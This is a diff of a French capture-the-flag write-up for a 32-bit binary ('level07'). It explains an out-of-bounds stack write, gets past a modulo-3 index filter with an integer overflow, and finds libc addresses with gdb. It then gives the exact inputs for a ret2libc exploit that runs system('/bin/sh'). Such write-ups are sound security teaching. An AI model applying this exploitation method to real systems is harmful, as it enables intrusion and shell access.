@@ -2,31 +2,86 @@
 
 ### Analyse
 
-L'analyse de l'exécutable (via objdump) révèle une boucle interactive permettant de lire (read_number) et d'écrire (store_number) des entiers dans un tableau alloué sur la pile (stack).
+Le binaire expose une boucle interactive avec deux opérations : `read_number` et `store_number`.
+Ces fonctions lisent et écrivent des entiers dans un tableau d'entiers alloué sur la stack.
 
-La vulnérabilité principale est un Out-of-Bounds Write (écriture hors limites) : le programme ne vérifie jamais si l'index fourni par l'utilisateur dépasse la taille réelle du tableau. Cela permet d'écrire n'importe où sur la pile, et notamment d'écraser l'adresse de retour (EIP) de la fonction main pour détourner le flux d'exécution.
+**Vulnérabilité 1 — Out-of-Bounds Write**
+Aucune vérification de l'index fourni par l'utilisateur n'est effectuée.
+On peut donc écrire n'importe où sur la stack, y compris sur le return address (`EIP`) de `main`.
 
-Le programme refuse d'écrire si l'index est un multiple de 3 (Index % 3 == 0) mais ce filtre modulo 3 peut être contourné grâce à un Integer Overflow (dépassement d'entier) inhérent à l'architecture 32-bits.
+**Vulnérabilité 2 — Filtre modulo 3**
+Le programme refuse d'écrire si `index % 3 == 0`.
+L'index cible (114) est un multiple de 3 → il faut contourner ce filtre.
+
+**Vulnérabilité 3 — Integer Overflow (32-bits)**
+Sur une architecture 32-bits, les adresses bouclent tous les `2^32 = 4 294 967 296` octets.
+En ajoutant un tour complet divisé par 4 à l'index bloqué, on obtient un index différent qui pointe physiquement au même endroit :
+
+```
+114 + (4 294 967 296 / 4) = 1 073 741 938
+1 073 741 938 % 3 = 2  ✓ (filtre contourné)
+1 073 741 938 * 4 = overflow → retombe sur l'offset 456
+```
+
+---
+
+### Calcul des offsets
+
+```
+EIP = return address de main
+Distance EIP - début tableau = 456 octets
+
+Index EIP  = 456 / 4 = 114        ← bloqué (114 % 3 == 0)
+Index réel = 114 + 2^32 / 4 = 1 073 741 938  ← autorisé
+
+Index EIP + 1 = 115  →  adresse de retour pour system() (inutile ici)
+Index EIP + 2 = 116  →  argument de system() = adresse de "/bin/sh"
+```
+
+---
+
+### Trouver les adresses
+
+```bash
+gdb ./level07
+break main
+run
+
+# Adresse de system()
+p system
+# → $1 = 0xf7e6aed0  =  4 159 090 384
+
+# Adresse de "/bin/sh"
+find &system, +9999999, "/bin/sh"
+# → 0xf7f897ec  =  4 160 264 172
+```
+
+---
+
+### Valeurs
+
+| Élément           | Adresse hex    | Valeur décimale   |
+|-------------------|----------------|-------------------|
+| `system()`        | `0xf7e6aed0`   | `4 159 090 384`   |
+| `"/bin/sh"`       | `0xf7f897ec`   | `4 160 264 172`   |
+| Index EIP (réel)  | —              | `1 073 741 938`   |
+| Index `/bin/sh`   | —              | `116`             |
+
+---
 
 ### Exploitation
 
-
-Nous allons rediriger l'EIP vers la fonction system() et lui passer la chaîne "/bin/sh" en argument.
-En analysant la pile, on constate que l'adresse de retour (EIP) du main se trouve à 456 octets du début du tableau.
-Puisque chaque case du tableau stocke un entier de 4 octets :
-Index cible = 456 / 4 = 114
-
-Faux_Index * 4 = 456 + 4 294 967 296
-L'index 114 est bloqué car 114 % 3 = 0.En 32-bits, la mémoire "boucle" tous les 4 294 967 296 octets (2^{32}). L'adresse finale est calculée en faisant Index * 4.Pour faire un tour complet et retomber sur la case 114, on ajoute un quart de la limite mémoire à notre index :114 + (4 294 967 296 / 4) = 1073741938. L'index 1073741938 pointe physiquement sur l'EIP
-
-Adresse de system : 0xf7e6aed0 = 4159090384, l'adresse de "/bin/sh" : 0xf7f897ec = 4160264172.
-
+```bash
+# Écraser EIP avec l'adresse de system()
 Input command: store
- Number: 4159090384
- Index: 1073741938
+Number: 4159090384
+Index: 1073741938
 
- Input command: store
- Number: 4160264172
- Index: 116
+# Placer "/bin/sh" comme argument de system() (EIP + 2)
+Input command: store
+Number: 4160264172
+Index: 116
 
- Input command: quit
+# Déclencher le return → system("/bin/sh")
+Input command: quit
+```
